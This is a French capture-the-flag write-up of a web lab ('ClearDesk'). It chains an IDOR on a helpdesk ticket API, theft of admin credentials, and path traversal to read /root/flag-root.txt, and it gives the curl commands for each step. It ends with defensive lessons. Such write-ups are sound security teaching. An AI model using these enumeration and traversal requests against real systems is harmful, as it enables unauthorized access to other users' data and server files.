# Compte rendu : ClearDesk

Plateforme : HackerDNA (https://hackerdna.com/labs/cleardesk)
Auteur : SRH
Catégorie : Sécurité Web & API
Difficulté : Moyenne
Tags : IDOR, API Security, Path Traversal, Access Control, Privilege Escalation
XP : +400 XP

## Scénario
L'API du helpdesk informatique de ClearDesk authentifie chaque requête, mais vérifie-t-elle les autorisations ? L'endpoint des tickets vérifie qui vous êtes mais pas ce que vous êtes autorisé à voir. L'objectif est d'énumérer les ressources auxquelles vous ne devriez pas avoir accès, d'enchaîner le vol d'identifiants avec l'escalade de privilèges, puis d'exploiter une fonctionnalité de lecture de fichiers pour atteindre le flag root.

Prérequis : bases HTTP et API REST, fondamentaux des applications web, compréhension de la différence entre authentification et autorisation, familiarité avec curl ou des outils de test d'API.

## Chaîne d'Attaque
[Reconnaissance] → [IDOR sur les tickets] → [Vol d'identifiants admin] → [Escalade de privilèges] → [Path Traversal] → [Flag user] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
L'application expose une interface de helpdesk avec un formulaire de login. Un compte de démonstration est présent directement dans le code source HTML de la page de connexion (guest:guest2026). Une fois authentifié, un cookie de session Flask est délivré.

## Étape 2 — IDOR sur l'endpoint des tickets
L'API expose un endpoint /api/tickets qui retourne les tickets de l'utilisateur connecté. L'endpoint /api/ticket/<id> retourne un ticket par son ID, sans vérifier l'appartenance. On énumère les IDs séquentiels pour accéder aux tickets des autres utilisateurs.

# Connexion guest
curl -s -c cookies.txt -X POST http://<IP>/login -d 'username=guest&password=guest2026'

# Énumération des tickets
for i in $(seq 1 10); do curl -s -b cookies.txt http://<IP>/api/ticket/$i; done

Résultat attendu : un ticket (par exemple le ticket 8) contient les identifiants du compte administrateur dans sa description.

## Étape 3 — Connexion admin et vol d'identifiants
On utilise les identifiants trouvés dans le ticket pour se connecter en tant qu'administrateur. Un nouveau cookie de session est délivré.

curl -s -c admin_cookies.txt -X POST http://<IP>/login -d 'username=admin&password=<PASSWORD_ADMIN>'

## Étape 4 — Path Traversal sur la fonctionnalité de lecture de fichiers
Le dashboard admin expose une fonctionnalité de visualisation de logs via /admin/logs?file=<filename>. Le paramètre file est vulnérable au path traversal, permettant de remonter à la racine du système et de lire le flag root.

curl -s -b admin_cookies.txt "http://<IP>/admin/logs?file=../../../../root/flag-root.txt"

Résultat attendu : le contenu du fichier /root/flag-root.txt est affiché dans la réponse.

Flag User : <USER_FLAG>
Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne d'exploitation classique : une faille IDOR dans l'API permet de voler les identifiants d'un administrateur, puis une fonctionnalité de lecture de fichiers mal sécurisée (path traversal) permet d'atteindre le flag root. La distinction entre authentification et autorisation est au cœur de la vulnérabilité IDOR.

## Leçons Apprises
1. Toujours vérifier les autorisations sur chaque requête (pas seulement l'authentification).
2. Utiliser des identifiants non prévisibles (UUID) pour les ressources sensibles.
3. Ne jamais stocker d'identifiants en clair dans des tickets ou des descriptions.
4. Valider les paramètres de fichier côté serveur pour prévenir le path traversal.
5. Une faille IDOR peut être le point d'entrée d'une compromission complète du système.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
